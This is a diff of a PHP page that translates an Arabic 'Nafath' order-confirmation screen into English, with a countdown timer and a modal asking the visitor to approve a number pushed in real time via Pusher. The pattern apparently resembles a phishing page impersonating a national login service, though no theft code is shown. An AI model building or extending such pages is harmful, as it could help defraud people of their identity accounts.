@@ -1,8 +1,8 @@
 <?php
 session_start();
+require_once '../includes/lang.php';
+set_site_lang('en');
 
-require_once 'includes/lang.php';
-set_site_lang('ar');
 
 // ✅ Get user ID from URL parameter or session
 $userId = null;
@@ -31,14 +31,14 @@ $_SESSION['client_id'] = $userId;
 $_SESSION['current_user_id'] = $userId;
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تأكيد الطلب - نفاذ</title>
+  <title>Order Confirmation - Nafath</title>
   <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
-  <link rel="stylesheet" href="includes/lang-toggle.css">
-  <style>
+  <link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
     :root { --brand:#0a3550; }
     * { box-sizing: border-box; }
     html,body { height:100%; margin:0; font-family: Arial, sans-serif; background:#fff; }
@@ -158,26 +158,26 @@ $_SESSION['current_user_id'] = $userId;
 
   <main class="stage">
     <div class="img-wrap">
-      <img src="image/sorn.png" alt="الصورة">
+      <img src="image/sorn.png" alt="Image">
     </div>
   </main>
 
   <div class="timer-bar" aria-live="polite">
-    <p class="timer-title">الوقت المتبقي</p>
+    <p class="timer-title">Time Remaining</p>
     <div id="timer" class="timer">01:00</div>
   </div>
 
   <!-- مودال نفاذ -->
   <div class="overlay" id="overlay">
     <div class="modal">
-      <h2>الرجاء فتح تطبيق نفاذ وتأكيد الطلب بإختيار الرقم أدناه</h2>
+      <h2>Please open the Nafath app and confirm the request by selecting the number below</h2>
       
       <!-- الرقم -->
       <div id="nafathNumber" class="nafath-number">...</div>
       
-      <p class="waiting-msg">⏳ في انتظار الرقم من النظام</p>
+      <p class="waiting-msg">Waiting for the number from the system</p>
       
-      <button class="close-btn" onclick="closeModal()">إغلاق</button>
+      <button class="close-btn" onclick="closeModal()">Close</button>
     </div>
   </div>
 
@@ -203,7 +203,7 @@ $_SESSION['current_user_id'] = $userId;
     }, 1000);
   })();
 
-  // 3) فتح/إغلاق المودال
+  // 3) فتح/Close المودال
   function openModal(){ 
     document.getElementById('overlay').style.display = 'flex';
   }
@@ -266,7 +266,7 @@ $_SESSION['current_user_id'] = $userId;
     
     const waitingMsg = document.querySelector('.waiting-msg');
     if (waitingMsg) {
-      waitingMsg.textContent = '✓ تم استلام الرقم';
+      waitingMsg.textContent = 'Number received';
       waitingMsg.style.color = '#28a745';
     }
   }
